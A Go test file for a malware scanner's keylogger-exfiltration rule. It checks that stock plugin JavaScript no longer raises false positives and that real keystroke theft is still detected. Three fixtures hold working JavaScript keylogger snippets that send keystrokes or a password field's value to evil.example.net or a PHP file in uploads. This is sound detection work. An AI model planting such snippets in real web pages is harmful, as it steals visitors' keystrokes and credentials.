package signatures

import "testing"

// Go-fallback parity for the 2026-07-24 exfil_keylogger_js false positives.
// The YAML rule had drifted far looser than its YARA-X counterpart: it needed
// only a key handler followed anywhere by a network call, which every minified
// plugin bundle satisfies. These reproduce the stock shapes that fired and keep
// real keystroke exfiltration detectable.

const yoastBundleShape = `).id&&"INPUT"===e.target.tagName&&e.preventDefault()}return addEventListener("keydown",e),` +
	`()=>removeEventListener("keydown",e)}),[]),(0,l.useCallback)((e=>fetch("https://my.yoast.com/api/Mailing-list/subscribe",` +
	`{method:"POST",mode:"cors",cache:"no-cache",credentials:"same-origin",headers:{"Content-Type":"application/json"},` +
	`redirect:"follow",referrerPolicy:"no-referrer",body:JSON.stringify({customerDetails:{firstName:"",email:e},` +
	`list:"Yoast newsletter",source:"free"})})).json()}(r)).error?(s("error"),i(ad)):(s("success"),i(od))}),[r]),` +
	`u=(0,l.useCallback)((e=>{s("waiting"),n(e.target.value)}),[])`

func TestKeyloggerYAML_StockPluginBundle(t *testing.T) {
	scanner := loadRepoScanner(t)
	if hasRule(scanner.ScanContent([]byte(yoastBundleShape), ".js"), "exfil_keylogger_js") {
		t.Error("exfil_keylogger_js FP: matched stock Yoast bundle")
	}
}

func TestKeyloggerYAML_SearchAsYouTypeBundle(t *testing.T) {
	scanner := loadRepoScanner(t)
	legit := []byte(`e.addEventListener("keyup",function(){var q=document.getElementById("s")` +
		`,r=new XMLHttpRequest;r.open("POST","/wp-admin/admin-ajax.php"),r.send("action=search&term="+q.value)})`)
	if hasRule(scanner.ScanContent(legit, ".js"), "exfil_keylogger_js") {
		t.Error("exfil_keylogger_js FP: matched search-as-you-type widget posting its own input value")
	}
}

func TestKeyloggerYAML_RealKeystrokeExfilStillDetected(t *testing.T) {
	scanner := loadRepoScanner(t)
	mal := []byte(`var b="";document.addEventListener("keydown",function(e){b+=String.fromCharCode(e.keyCode);` +
		`fetch("https://evil.example.net/c",{method:"POST",body:b})});`)
	if !hasRule(scanner.ScanContent(mal, ".js"), "exfil_keylogger_js") {
		t.Error("exfil_keylogger_js regression: buffered keystroke exfiltration not detected")
	}
}

func TestKeyloggerYAML_RealKeystrokeBeaconStillDetected(t *testing.T) {
	scanner := loadRepoScanner(t)
	mal := []byte(`window.onkeypress=function(e){navigator.sendBeacon("/wp-content/uploads/log.php","k="+e.key)};`)
	if !hasRule(scanner.ScanContent(mal, ".js"), "exfil_keylogger_js") {
		t.Error("exfil_keylogger_js regression: keystroke beacon not detected")
	}
}

func TestKeyloggerYAML_CredentialFieldExfilStillDetected(t *testing.T) {
	scanner := loadRepoScanner(t)
	mal := []byte(`document.onkeyup=function(){var i=new Image;i.src="https://evil.example.net/p?c="+document.getElementById("password").value};`)
	if !hasRule(scanner.ScanContent(mal, ".js"), "exfil_keylogger_js") {
		t.Error("exfil_keylogger_js regression: credential-field exfil not detected")
	}
}
